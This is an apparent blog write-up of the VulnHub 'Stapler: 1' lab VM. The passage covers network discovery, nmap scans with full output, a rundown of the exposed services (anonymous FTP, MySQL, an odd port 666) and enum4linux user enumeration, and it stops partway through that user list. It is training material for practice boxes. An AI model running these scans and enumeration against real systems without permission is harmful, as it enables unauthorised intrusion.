@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#Stapler: 1</strong></h1>
+        <a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a><br>
+        <br>
+        This is my route through Stapler. There are apparently 2 ways to get a shell and 3 ways to get root. There's a lot of rabbit holes throughout this box, and it felt like I fell for all of them.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>0) Find the VM's IP</strong></h3><br>
+        To find your VM's IP address, set your VM to ‘bridged’ so that it gets assigned an IP on your internal network and then use netdiscover to scan your network: <code>netdiscover -r &lt;internal network&gt;/24</code><br>
+        <br>
+        <code>netdiscover -r 192.168.1.1/24</code><br>
+        192.168.1.237 is my Stapler box.<br>
+        Take a snapshot of the VM at this point, just to be safe.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 192.168.1.237</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;nmap<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>intial.txt&nbsp;192.168.1.237<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-13&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>39&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">red</span>.initech.lan&nbsp;(192.168.1.237)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00024s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;992&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                20/tcp&nbsp;&nbsp;&nbsp;closed&nbsp;ftp-data<br>
+                21/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsftpd&nbsp;2.0.8&nbsp;or&nbsp;later<br>
+                |&nbsp;ftp-anon:&nbsp;Anonymous&nbsp;FTP&nbsp;login&nbsp;allowed&nbsp;(FTP&nbsp;code&nbsp;230)<br>
+                |_Can't&nbsp;get&nbsp;directory&nbsp;listing:&nbsp;PASV&nbsp;failed:&nbsp;550&nbsp;Permission&nbsp;denied.<br>
+                |&nbsp;ftp-syst:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;STAT:&nbsp;<br>
+                |&nbsp;FTP&nbsp;server&nbsp;status:<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connected&nbsp;to&nbsp;192.168.1.183<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Logged&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;as&nbsp;<span style="color:#ff9d00;font-weight:700">ftp</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ASCII<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;No&nbsp;session&nbsp;bandwidth&nbsp;limit<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Session&nbsp;timeout&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;seconds&nbsp;is&nbsp;300<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Control&nbsp;connection&nbsp;is&nbsp;plain&nbsp;text<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Data&nbsp;connections&nbsp;will&nbsp;be&nbsp;plain&nbsp;text<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;At&nbsp;session&nbsp;startup,&nbsp;client&nbsp;count&nbsp;was&nbsp;5<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vsFTPd&nbsp;3.0.3&nbsp;-&nbsp;secure,&nbsp;fast,&nbsp;stable<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_End&nbsp;of&nbsp;status<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.2p2&nbsp;Ubuntu&nbsp;4&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu&nbsp;Linux<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;protocol&nbsp;2.0<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ssh-hostkey<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;2048&nbsp;81<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>ce<span style="color:#ff9d00;font-weight:700">:</span>a1<span style="color:#ff9d00;font-weight:700">:</span>1a<span style="color:#ff9d00;font-weight:700">:</span>05<span style="color:#ff9d00;font-weight:700">:</span>b1<span style="color:#ff9d00;font-weight:700">:</span>69<span style="color:#ff9d00;font-weight:700">:</span>4f<span style="color:#ff9d00;font-weight:700">:</span>4d<span style="color:#ff9d00;font-weight:700">:</span>ed<span style="color:#ff9d00;font-weight:700">:</span>80<span style="color:#ff9d00;font-weight:700">:</span>28<span style="color:#ff9d00;font-weight:700">:</span>e8<span style="color:#ff9d00;font-weight:700">:</span>99<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>RSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;256&nbsp;5b<span style="color:#ff9d00;font-weight:700">:</span>a5<span style="color:#ff9d00;font-weight:700">:</span>bb<span style="color:#ff9d00;font-weight:700">:</span>67<span style="color:#ff9d00;font-weight:700">:</span>91<span style="color:#ff9d00;font-weight:700">:</span>1a<span style="color:#ff9d00;font-weight:700">:</span>51<span style="color:#ff9d00;font-weight:700">:</span>c2<span style="color:#ff9d00;font-weight:700">:</span>d3<span style="color:#ff9d00;font-weight:700">:</span>21<span style="color:#ff9d00;font-weight:700">:</span>da<span style="color:#ff9d00;font-weight:700">:</span>c0<span style="color:#ff9d00;font-weight:700">:</span>ca<span style="color:#ff9d00;font-weight:700">:</span>f0<span style="color:#ff9d00;font-weight:700">:</span>db<span style="color:#ff9d00;font-weight:700">:</span>9e&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ECDSA<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;256&nbsp;6d<span style="color:#ff9d00;font-weight:700">:</span>01<span style="color:#ff9d00;font-weight:700">:</span>b7<span style="color:#ff9d00;font-weight:700">:</span>73<span style="color:#ff9d00;font-weight:700">:</span>ac<span style="color:#ff9d00;font-weight:700">:</span>b0<span style="color:#ff9d00;font-weight:700">:</span>93<span style="color:#ff9d00;font-weight:700">:</span>6f<span style="color:#ff9d00;font-weight:700">:</span>fa<span style="color:#ff9d00;font-weight:700">:</span>b9<span style="color:#ff9d00;font-weight:700">:</span>89<span style="color:#ff9d00;font-weight:700">:</span>e6<span style="color:#ff9d00;font-weight:700">:</span>ae<span style="color:#ff9d00;font-weight:700">:</span>3c<span style="color:#ff9d00;font-weight:700">:</span>ab<span style="color:#ff9d00;font-weight:700">:</span>d3&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ED25519<span style="color:#ff9d00;font-weight:700">)</span><br>
+                53<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dnsmasq&nbsp;2.75<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;dns-nsid<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;bind.version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;dnsmasq-2.75<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHP&nbsp;cli&nbsp;server&nbsp;5.5&nbsp;or&nbsp;later<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;404&nbsp;Not&nbsp;Found<br>
+                139<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;netbios-ssn&nbsp;Samba&nbsp;smbd&nbsp;4.3.9-Ubuntu&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>workgroup<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;WORKGROUP<span style="color:#ff9d00;font-weight:700">)</span><br>
+                666<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;doom?<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;fingerprint-strings<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;NULL<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message2.jpgUT&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;QWux<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"DL[E<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#;3[<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\xf6<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;u([r<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qYQq<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Y_?n2<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&amp;M~{<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9-a)T<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;L}AJ<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;.npy.9<br>
+                3306/tcp&nbsp;open&nbsp;&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MySQL&nbsp;5.7.12-0ubuntu1<br>
+                |&nbsp;mysql-info:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Protocol:&nbsp;10<br>
+                |&nbsp;&nbsp;&nbsp;Version:&nbsp;5.7.12-0ubuntu1<br>
+                |&nbsp;&nbsp;&nbsp;Thread&nbsp;ID:&nbsp;7<br>
+                |&nbsp;&nbsp;&nbsp;Capabilities&nbsp;flags:&nbsp;63487<br>
+                |&nbsp;&nbsp;&nbsp;Some&nbsp;Capabilities:&nbsp;DontAllowDatabaseTableColumn,&nbsp;Support41Auth,&nbsp;SupportsTransactions,&nbsp;ConnectWithDatabase,&nbsp;LongColumnFlag,&nbsp;IgnoreSigpipes,&nbsp;SupportsCompression,&nbsp;Speaks41ProtocolOld,&nbsp;LongPassword,&nbsp;FoundRows,&nbsp;ODBCClient,&nbsp;Speaks41ProtocolNew,&nbsp;IgnoreSpaceBeforeParenthesis,&nbsp;SupportsLoadDataLocal,&nbsp;InteractiveClient,&nbsp;SupportsMultipleResults,&nbsp;SupportsAuthPlugins,&nbsp;SupportsMultipleStatments<br>
+                |&nbsp;&nbsp;&nbsp;Status:&nbsp;Autocommit<br>
+                |&nbsp;&nbsp;&nbsp;Salt:&nbsp;A\x084\x11`\x0DM]\x1B=J#&nbsp;WM?_ Fn<br>
+                |_&nbsp;&nbsp;Auth&nbsp;Plugin&nbsp;Name:&nbsp;88<br>
+                1&nbsp;service&nbsp;unrecognized&nbsp;despite&nbsp;returning&nbsp;data.&nbsp;If&nbsp;you&nbsp;know&nbsp;the&nbsp;service/version,&nbsp;please&nbsp;submit&nbsp;the&nbsp;following&nbsp;fingerprint&nbsp;at&nbsp;https://nmap.org/cgi-bin/submit.cgi?new-service&nbsp;:<br>
+                SF-Port666-TCP:V=7.70%I=7%D=4/13%Time=5CB202B9%P=i686-pc-linux-gnu%r(NULL,<br>
+                SF:2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x152<br>
+                SF:\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04\<br>
+                SF:xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2\<br>
+                SF:x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x0<br>
+                SF:c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb2<br>
+                SF:\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\x<br>
+                SF:eeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3\<br>
+                SF:x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0\<br>
+                SF:xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x87<br>
+                SF:\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf4<br>
+                SF:\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xdc<br>
+                SF:\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5\<br>
+                SF:x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf\<br>
+                SF:xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\x<br>
+                SF:c3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x8<br>
+                SF:a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\xe<br>
+                SF:7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\x<br>
+                SF:f6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x9<br>
+                SF:a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\xf<br>
+                SF:1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\xf<br>
+                SF:8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\x<br>
+                SF:d7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\xd<br>
+                SF:2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\x<br>
+                SF:f9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[\<br>
+                SF:x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xcc<br>
+                SF:\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7\<br>
+                SF:xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\xf<br>
+                SF:d\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96\<br>
+                SF:x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f\x<br>
+                SF:d0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4\x<br>
+                SF:ed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x8<br>
+                SF:8\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbcL<br>
+                SF:}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\.<br>
+                SF:npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\xf<br>
+                SF:6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf3<br>
+                SF:\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?\<br>
+                SF:xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");<br>
+                MAC&nbsp;Address:&nbsp;00:0C:29:F4:AE:9F&nbsp;(VMware)<br>
+                Device&nbsp;type:&nbsp;general&nbsp;purpose<br>
+                Running:&nbsp;Linux&nbsp;3.X|4.X<br>
+                OS&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel:3&nbsp;cpe:/o:linux:linux_kernel:4<br>
+                OS&nbsp;details:&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9<br>
+                Network&nbsp;Distance:&nbsp;1&nbsp;hop<br>
+                Service&nbsp;Info:&nbsp;Host:&nbsp;RED;&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                <br>
+                Host&nbsp;script&nbsp;results:<br>
+                |_clock-skew:&nbsp;mean:&nbsp;37m37s,&nbsp;deviation:&nbsp;34m37s,&nbsp;median:&nbsp;57m36s<br>
+                |_nbstat:&nbsp;NetBIOS&nbsp;name:&nbsp;RED,&nbsp;NetBIOS&nbsp;user:&nbsp;&lt;unknown&gt;,&nbsp;NetBIOS&nbsp;MAC:&nbsp;&lt;unknown&gt;&nbsp;(unknown)<br>
+                |&nbsp;smb-os-discovery:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;OS:&nbsp;Windows&nbsp;6.1&nbsp;(Samba&nbsp;4.3.9-Ubuntu)<br>
+                |&nbsp;&nbsp;&nbsp;Computer&nbsp;name:&nbsp;red<br>
+                |&nbsp;&nbsp;&nbsp;NetBIOS&nbsp;computer&nbsp;name:&nbsp;RED\x00<br>
+                |&nbsp;&nbsp;&nbsp;Domain&nbsp;name:&nbsp;\x00<br>
+                |&nbsp;&nbsp;&nbsp;FQDN:&nbsp;red<br>
+                |_&nbsp;&nbsp;System&nbsp;time:&nbsp;2019-04-13T17:37:27+01:00<br>
+                |&nbsp;smb-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;account_used:&nbsp;guest<br>
+                |&nbsp;&nbsp;&nbsp;authentication_level:&nbsp;user<br>
+                |&nbsp;&nbsp;&nbsp;challenge_response:&nbsp;supported<br>
+                |_&nbsp;&nbsp;message_signing:&nbsp;disabled&nbsp;(dangerous,&nbsp;but&nbsp;default)<br>
+                |&nbsp;smb2-security-mode:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2.02:&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;Message&nbsp;signing&nbsp;enabled&nbsp;but&nbsp;not&nbsp;required<br>
+                |&nbsp;smb2-time:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;date:&nbsp;2019-04-13&nbsp;17:37:27<br>
+                |_&nbsp;&nbsp;start_date:&nbsp;N/A<br>
+                <br>
+                OS&nbsp;and&nbsp;Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;48.46&nbsp;seconds</span>
+            </div>
+        </div><br>
+        <br>
+        Lots of ports and services!<br>
+        A full port scan reveals an extra port/service - <code>nmap -p- -sV -T4 -oN nmap/full.txt 192.168.1.237</code><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1#&nbsp;nmap&nbsp;-p-&nbsp;-sV&nbsp;-T4&nbsp;-oN&nbsp;nmap<span style="color:#ff9d00;font-weight:700">/</span>full.txt&nbsp;192.168.1.237<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-04-13&nbsp;16<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">red</span>.initech.lan&nbsp;(192.168.1.237)<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.00043s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65523&nbsp;filtered&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                ...<br>
+                12380/tcp&nbsp;open&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;((Ubuntu))<br>
+                ...<br>
+                <br>
+                Service&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.<br>
+                Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;100.09&nbsp;seconds
+            </div>
+        </div><br>
+        <br>
+        • 21/ftp allows for anonymous login (but no directory listing allowed). You could also bruteforce.<br>
+        • 22/ssh is to be noted down for later.<br>
+        • 53/dns there isn't much to do with on a vm.<br>
+        • 80/http reports a php cli server(?) - so probably isn't a usual site (development perhaps?). Nikto/gobuster it.<br>
+        • 139/samba can be used to gather usernames.<br>
+        • 666/doom? looks like it contains a hidden message.<br>
+        • 3306/mysql might allow remote login.<br>
+        • 12380/http looks like a more usual web server.<br>
+        <br>
+        I looked at all of these, trying to gather information from each and deciding where to go next from there.<br>
+        If you nikto scan the web server on 12380 you'll find that it's actually a HTTPS site. Despite this, the site wouldn't work for me. I think it was a VM issue, it was redirecting to a non-existent internal URL ¯\_(ツ)_/¯<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) samba to ssh</strong></h2><br>
+        Run <code>enum4linux</code> on the samba service and you will be returned a list of enumerated usernames<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>139samba#&nbsp;enum4linux&nbsp;192.168.1.237<br>
+                Starting&nbsp;enum4linux&nbsp;v0.8.9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>labs.portcullis.co.uk<span style="color:#ff9d00;font-weight:700">/</span>application<span style="color:#ff9d00;font-weight:700">/</span>enum4linux<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;on&nbsp;Sat&nbsp;Apr&nbsp;13&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>56<span style="color:#ff9d00;font-weight:700">:</span>42&nbsp;2019<br>
+                &nbsp;==========================&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;&nbsp;&nbsp;Target&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;==========================&nbsp;<br>
+                Target&nbsp;...........&nbsp;192.168.1.237<br>
+                RID&nbsp;Range&nbsp;........&nbsp;500-550,1000-1050<br>
+                Username&nbsp;.........&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br>
+                Password&nbsp;.........&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br>
+                Known&nbsp;Usernames&nbsp;..&nbsp;administrator,&nbsp;guest,&nbsp;krbtgt,&nbsp;domain&nbsp;admins,&nbsp;root,&nbsp;bin,&nbsp;none<br>
+                <br>
+                ...<br>
+                <br>
+                [+]&nbsp;Enumerating&nbsp;users&nbsp;using&nbsp;SID&nbsp;S-1-22-1&nbsp;and&nbsp;logon&nbsp;username&nbsp;<span style="color:#3ad900;font-weight:400">''</span>,&nbsp;password&nbsp;<span style="color:#3ad900;font-weight:400">''</span><br>
+                S-1-22-1-1000&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\p</span>eter&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1001&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\R</span>Nunemaker&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1002&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\E</span>Tollefson&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
+                S-1-22-1-1003&nbsp;Unix&nbsp;User<span style="color:#333333;font-weight:400">\D</span>Swanger&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Local&nbsp;User<span style="color:#ff9d00;font-weight:700">)</span><br>
